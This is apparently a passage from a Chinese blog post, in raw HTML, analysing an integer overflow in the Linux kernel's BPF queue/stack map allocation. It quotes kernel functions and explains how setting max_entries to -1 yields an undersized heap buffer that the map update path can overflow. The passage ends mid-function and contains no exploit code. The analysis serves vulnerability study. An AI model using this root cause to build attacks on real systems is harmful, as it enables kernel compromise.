class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321  <span class="comment">// #linux/tools/lib/bpf/bpf.c</span></span></span><br><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;       </span><br><span class="line"><span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">err = map_create(&amp;attr); <span class="comment">// add</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">err = map_lookup_elem(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">err = map_update_elem(&amp;attr); <span class="comment">//edit</span></span><br><span class="line">***********************</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个系统调用有三个参数：<code>cmd</code>  、<code>uattr</code>、<code>size</code>、然后再将<code>uattr</code> 内容负责到<code>attr</code>中然后传到<code>map_create</code>,通过<code>cmd</code> 来选择功能。cmd 的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_cmd &#123;</span><br><span class="line">BPF_MAP_CREATE,</span><br><span class="line">BPF_MAP_LOOKUP_ELEM,</span><br><span class="line">BPF_MAP_UPDATE_ELEM,</span><br><span class="line">BPF_MAP_DELETE_ELEM,</span><br><span class="line">BPF_MAP_GET_NEXT_KEY,</span><br><span class="line">BPF_PROG_LOAD,</span><br><span class="line">BPF_OBJ_PIN,</span><br><span class="line">BPF_OBJ_GET,</span><br><span class="line">BPF_PROG_ATTACH,</span><br><span class="line">BPF_PROG_DETACH,</span><br><span class="line">BPF_PROG_TEST_RUN,</span><br><span class="line">BPF_PROG_GET_NEXT_ID,</span><br><span class="line">BPF_MAP_GET_NEXT_ID,</span><br><span class="line">BPF_PROG_GET_FD_BY_ID,</span><br><span class="line">BPF_MAP_GET_FD_BY_ID,</span><br><span class="line">BPF_OBJ_GET_INFO_BY_FD,</span><br><span class="line">BPF_PROG_QUERY,</span><br><span class="line">BPF_RAW_TRACEPOINT_OPEN,</span><br><span class="line">BPF_BTF_LOAD,</span><br><span class="line">BPF_BTF_GET_FD_BY_ID,</span><br><span class="line">BPF_TASK_FD_QUERY,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来看看 map_create 函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span><span class="comment">//参数attr</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> f_flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line"><span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">     !node_online(numa_node)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line"><span class="built_in">map</span> = find_and_alloc_map(attr); [<span class="number">2</span>]            <span class="comment">// 参数attr</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">err = bpf_obj_name_cpy(<span class="built_in">map</span>-&gt;name, attr-&gt;map_name);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">btf = btf_get_by_fd(attr-&gt;btf_fd);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(btf)) &#123;</span><br><span class="line">err = PTR_ERR(btf);</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = map_check_btf(<span class="built_in">map</span>, btf, attr-&gt;btf_key_type_id,</span><br><span class="line">    attr-&gt;btf_value_type_id);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">btf_put(btf);</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>-&gt;btf = btf;</span><br><span class="line"><span class="built_in">map</span>-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;</span><br><span class="line"><span class="built_in">map</span>-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = security_bpf_map_alloc(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">err = bpf_map_init_memlock(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map_sec;</span><br><span class="line"></span><br><span class="line">err = bpf_map_alloc_id(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">err = bpf_map_new_fd(<span class="built_in">map</span>, f_flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* failed to allocate fd.</span></span><br><span class="line"><span class="comment"> * bpf_map_put() is needed because the above</span></span><br><span class="line"><span class="comment"> * bpf_map_alloc_id() has published the map</span></span><br><span class="line"><span class="comment"> * to the userspace and the userspace may</span></span><br><span class="line"><span class="comment"> * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bpf_map_put(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_map:</span><br><span class="line">bpf_map_release_memlock(<span class="built_in">map</span>);</span><br><span class="line">free_map_sec:</span><br><span class="line">security_bpf_map_free(<span class="built_in">map</span>);</span><br><span class="line">free_map_nouncharge:</span><br><span class="line">btf_put(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line"><span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 [2] 生成和初始化一个 struct bpf_map *map;</p><p>find_and_alloc_map 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];</span><br><span class="line"><span class="keyword">if</span> (!ops)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">err = ops-&gt;map_alloc_check(attr);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">ops = &amp;bpf_map_offload_ops;</span><br><span class="line"><span class="built_in">map</span> = ops-&gt;map_alloc(attr);[<span class="number">3</span>] </span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 map_alloc 就是 <code>.map_alloc = queue_stack_map_alloc</code> </p><p>queue_stack_map_alloc的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u32 size, value_size;</span><br><span class="line">u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = attr-&gt;max_entries + <span class="number">1</span>; [<span class="number">4</span>]</span><br><span class="line">value_size = attr-&gt;value_size;[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">cost = queue_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);[<span class="number">7</span>]</span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看 bpf_map_area_alloc 函数再一起结合上面的分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">bpf_map_area_alloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> numa_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* We definitely need __GFP_NORETRY, so OOM killer doesn't</span></span><br><span class="line"><span class="comment"> * trigger under memory pressure as we really just want to</span></span><br><span class="line"><span class="comment"> * fail instead.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">gfp_t</span> flags = __GFP_NOWARN | __GFP_NORETRY | __GFP_ZERO;</span><br><span class="line"><span class="keyword">void</span> *area;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= (PAGE_SIZE &lt;&lt; PAGE_ALLOC_COSTLY_ORDER)) &#123;</span><br><span class="line">area = kmalloc_node(size, GFP_USER | flags, numa_node);</span><br><span class="line"><span class="keyword">if</span> (area != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> __vmalloc_node_flags_caller(size, numa_node, GFP_KERNEL | flags,</span><br><span class="line">   __builtin_return_address(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 整个调用链来看，可以看出 <code>attr</code> 是可控并且在传递的过程没有被改变。</p><p>然后再回到 queue_stack_map_alloc 函数，主要的漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size = attr-&gt;max_entries + 1; [4]</span><br><span class="line">value_size = attr-&gt;value_size;[5]</span><br><span class="line">queue_size = sizeof(*qs) + (u64) value_size * size;[6]</span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);[7]</span><br></pre></td></tr></table></figure><p>整个attr 是可控的，如果令attr-&gt;max_entries = -1。那size 就为 0，那 queue_size 的大小 为 sizeof(*qs)</p><p>那么此时的size 是远远大于 kmalloc_node 出来的size，如果该系统调用存在编辑功能，那就能产生了堆上的整数溢出漏洞。就可以修改该堆块后面的值。</p><pre><code>case BPF_MAP_UPDATE_ELEM:    err = map_update_elem(&amp;attr); //edit</code></pre><p>map_update_elem ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *value;</span><br><span class="line">u32 value_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (!value)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must increment bpf_prog_active to avoid kprobe+bpf triggering from</span></span><br><span class="line"><span class="comment"> * inside bpf map update or delete otherwise deadlocks are possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">preempt_disable();</span><br><span class="line">__this_cpu_inc(bpf_prog_active);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123;</span><br><span class="line">err = bpf_percpu_hash_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123;</span><br><span class="line">err = bpf_percpu_array_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123;</span><br><span class="line">err = bpf_percpu_cgroup_storage_update(<span class="built_in">map</span>, key, value,</span><br><span class="line">       attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_FD_ARRAY(<span class="built_in">map</span>)) &#123;</span><br><span 